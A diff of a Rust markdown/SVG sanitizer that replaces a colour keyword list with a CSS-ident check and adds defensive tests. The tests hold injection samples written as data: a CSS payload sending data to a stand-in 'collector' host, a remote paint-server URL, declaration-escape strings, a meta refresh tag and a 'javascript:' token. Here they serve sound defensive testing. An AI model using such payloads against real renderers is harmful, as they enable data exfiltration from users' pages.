@@ -180,10 +180,6 @@ fn index_of_any(haystack: &[char], chars: &[char], from: usize) -> Option<usize>
     (from..haystack.len()).find(|&i| chars.contains(&haystack[i]))
 }
 
-/// Strip dangerous element blocks, tag-interior `on*=` handlers, and dangerous
-/// protocols from a chunk of HTML. Approximate by design — the render path
-/// constrains the input to the deterministic markdown renderer's output, so
-/// the substring sweep is defence in depth, not the primary gate.
 /// Does `index` mark the end of a tag NAME?
 ///
 /// An HTML tag name ends at whitespace, `/` or `>`, so a match on the bare
@@ -192,7 +188,7 @@ fn index_of_any(haystack: &[char], chars: &[char], from: usize) -> Option<usize>
 /// builder emits, and with the bare prefix the first of them lost its opening
 /// tag to this sweep, leaving the provenance document's text loose in the
 /// figure.
-/// 
+///
 /// Requiring the boundary narrows only false positives: no spelling of a real
 /// `<meta>` element survives it, because the name has to be delimited for a
 /// parser to read it as that element in the first place. End of input counts as
@@ -203,9 +199,7 @@ fn index_of_any(haystack: &[char], chars: &[char], from: usize) -> Option<usize>
 fn is_tag_name_boundary(s: &[char], index: usize) -> bool {
     match s.get(index) {
         None => true,
-        Some(c) => matches!(c, ' ' | '	' | '
-' | '
-' | '/' | '>'),
+        Some(c) => matches!(c, ' ' | '\t' | '\n' | '\r' | '/' | '>'),
     }
 }
 
@@ -223,6 +217,10 @@ fn index_of_element_open(s: &[char], open_tag: &str) -> Option<usize> {
     None
 }
 
+/// Strip dangerous element blocks, tag-interior `on*=` handlers, and dangerous
+/// protocols from a chunk of HTML. Approximate by design — the render path
+/// constrains the input to the deterministic markdown renderer's output, so
+/// the substring sweep is defence in depth, not the primary gate.
 pub fn sanitize_markdown_html(html: &str) -> String {
     if html.is_empty() {
         return String::new();
@@ -507,14 +505,32 @@ pub fn sanitize_css_value(value: &str) -> &str {
     if is_safe_css_value(value) { value } else { "" }
 }
 
-const COLOUR_KEYWORDS: &[&str] = &[
-    "none",
-    "transparent",
-    "currentcolor",
-    "inherit",
-    "initial",
-    "unset",
-];
+/// Is this a bare CSS IDENT — an ASCII letter or `-` followed by ASCII letters,
+/// digits, `-` and `_`?
+///
+/// This is what admits the 148 named colours (`red`, `steelblue`,
+/// `rebeccapurple`), the universal keywords (`none`, `transparent`,
+/// `currentColor`), the inheritance keywords, the SVG2 paint keywords
+/// (`context-fill`, `context-stroke`) and every colour keyword CSS has not
+/// shipped yet — as ONE rule rather than as a list somebody has to keep.
+///
+/// Enumerating the keywords instead is wrong, because the two ways of being
+/// wrong here are not symmetric. A missing keyword produces no error an author
+/// can see: the paint is replaced by `none`, so a document that was correct
+/// yesterday silently renders a differently-coloured picture. Meanwhile an ident
+/// buys an attacker nothing at all — it cannot fetch, cannot leave its
+/// declaration and cannot name a paint server, because every one of those needs
+/// punctuation this test refuses.
+fn is_css_ident(value: &str) -> bool {
+    let mut chars = value.chars();
+    match chars.next() {
+        None => false,
+        Some(head) if head.is_ascii_alphabetic() || head == '-' => {
+            chars.all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
+        }
+        Some(_) => false,
+    }
+}
 
 const COLOUR_FUNCTIONS: &[&str] = &[
     "rgb(", "rgba(", "hsl(", "hsla(", "oklch(", "oklab(", "lch(", "lab(", "color(",
@@ -538,11 +554,13 @@ pub fn is_colour_value(value: &str) -> bool {
         return (n == 3 || n == 4 || n == 6 || n == 8)
             && digits.chars().all(|c| c.is_ascii_hexdigit());
     }
-    let lower = t.to_lowercase();
-    if COLOUR_KEYWORDS.contains(&lower.as_str()) {
+    if is_css_ident(t) {
         return true;
     }
-    COLOUR_FUNCTIONS.iter().any(|f| lower.starts_with(f)) && lower.ends_with(')') && is_safe_css_value(t)
+    let lower = t.to_lowercase();
+    COLOUR_FUNCTIONS.iter().any(|f| lower.starts_with(f))
+        && lower.ends_with(')')
+        && is_safe_css_value(t)
 }
 
 /// The SVG paint to emit: the value when it is a colour, `"none"` when it is not.
@@ -822,5 +840,107 @@ mod tests {
             sanitize_markdown_html("<p>the only one</p>"),
             "<p>the only one</p>"
         );
+    }
+
+    #[test]
+    fn css_value_denylist_refuses_only_what_leaves_the_declaration() {
+        // The finding's own payload: every character in it is individually
+        // innocuous, which is why a character denylist rather than a validity
+        // check is what catches it.
+        assert!(!is_safe_css_value("1fr;background:url(https://collector/?d=x)"));
+        assert!(!is_safe_css_value("a}b{color:red"));
+        assert!(!is_safe_css_value("a\\3b b"));
+        // Case-insensitive and whitespace-tolerant on the CSS side: `URL (` and
+        // `url<newline>(` are one token to a CSS tokenizer.
+        assert!(!is_safe_css_value("URL (x)"));
+        // ALLOW twins. If these fail the grammar has become unusable rather than
+        // strict, and every irregular grid is broken.
+        assert!(is_safe_css_value("1fr 2fr auto"));
+        assert!(is_safe_css_value("repeat(auto-fit, minmax(150px, 1fr))"));
+        assert!(is_safe_css_value("clamp(1rem, 2vw, 3rem)"));
+        assert!(is_safe_css_value(""));
+        assert_eq!(sanitize_css_value("a}b"), "");
+        assert_eq!(sanitize_css_value("1fr 2fr"), "1fr 2fr");
+    }
+
+    #[test]
+    fn paint_grammar_refuses_a_paint_server_and_admits_every_named_colour() {
+        // `url(https://collector/x)` contains no forbidden CHARACTER, so it
+        // passes the generic CSS rule. In an SVG `fill` it names a paint server
+        // the user agent FETCHES. Only a positive grammar excludes it.
+        assert_eq!(sanitize_paint_value("url(https://collector/x)"), "none");
+        assert_eq!(sanitize_paint_value("url(#grad)"), "none");
+        // `none` rather than empty, because an EMPTY fill INHERITS the enclosing
+        // group's paint instead of clearing it.
+        assert_eq!(sanitize_paint_value(""), "none");
+        // ALLOW twins. The named colour is the load-bearing one: an enumerated
+        // keyword list refuses `steelblue`, and its failure mode is silent —
+        // the shape is repainted, not reported.
+        for paint in [
+            "#39c",
+            "#336699",
+            "#336699ff",
+            "steelblue",
+            "currentColor",
+            "transparent",
+            "context-fill",
+            "rgb(1 2 3)",
+            "oklch(0.7 0.1 200)",
+        ] {
+            assert_eq!(sanitize_paint_value(paint), paint, "paint {paint}");
+        }
+    }
+
+    #[test]
+    fn anchor_tokens_are_closed_and_the_safe_pair_is_forced() {
+        // The whole finding. `opener` re-enables `window.opener` on a `_blank`
+        // link, handing the opened document a live reference to the opening one
+        // — and browsers imply `noopener` there, which is exactly why an
+        // explicit `opener` mattered: it OVERRIDES a user-agent default no
+        // document can know the version floor of.
+        let (target, rel) = sanitize_link_anchor(Some("_blank"), Some("opener"));
+        assert_eq!(target.as_deref(), Some("_blank"));
+        assert_eq!(rel.as_deref(), Some("noopener noreferrer"));
+
+        // The pair is forced with no declared rel at all.
+        let (_, rel) = sanitize_link_anchor(Some("_blank"), None);
+        assert_eq!(rel.as_deref(), Some("noopener noreferrer"));
+
+        // A target outside the closed set is OMITTED, not substituted: omitting
+        // says truthfully that the document declared nothing this renderer could
+        // honour, where substituting would put a value in the DOM the author
+        // never wrote.
+        for t in ["victim", "_parent", "_top"] {
+            let (target, _) = sanitize_link_anchor(Some(t), None);
+            assert_eq!(target, None, "target {t}");
+        }
+
+        // ALLOW twin — `_self` with a descriptive token forces nothing.
+        let (target, rel) = sanitize_link_anchor(Some("_self"), Some("nofollow"));
+        assert_eq!(target.as_deref(), Some("_self"));
+        assert_eq!(rel.as_deref(), Some("nofollow"));
+
+        // A link declaring neither slot emits neither attribute.
+        let (target, rel) = sanitize_link_anchor(None, None);
+        assert_eq!(target, None);
+        assert_eq!(rel, None);
+    }
+
+    #[test]
+    fn the_protocol_sweep_is_tag_anchored_and_the_element_match_is_delimited() {
+        // Unanchored, the sweep rewrote VISIBLE PROSE: a document explaining the
+        // hazard could not state it, because the literal token in a `<code>`
+        // element's TEXT was replaced with `about:blank`.
+        assert_eq!(
+            sanitize_markdown_html("<p>Never write <code>javascript:</code> here</p>"),
+            "<p>Never write <code>javascript:</code> here</p>"
+        );
+        // `<metadata>` is not `<meta>` and `<linearGradient>` is not `<link>`,
+        // both of which the drawing builder emits.
+        assert_eq!(
+            sanitize_markdown_html("<p><meter value=\"0.6\"></meter></p>"),
+            "<p><meter value=\"0.6\"></meter></p>"
+        );
+        assert!(!sanitize_markdown_html("<meta http-equiv=\"refresh\">").contains("refresh"));
     }
 }
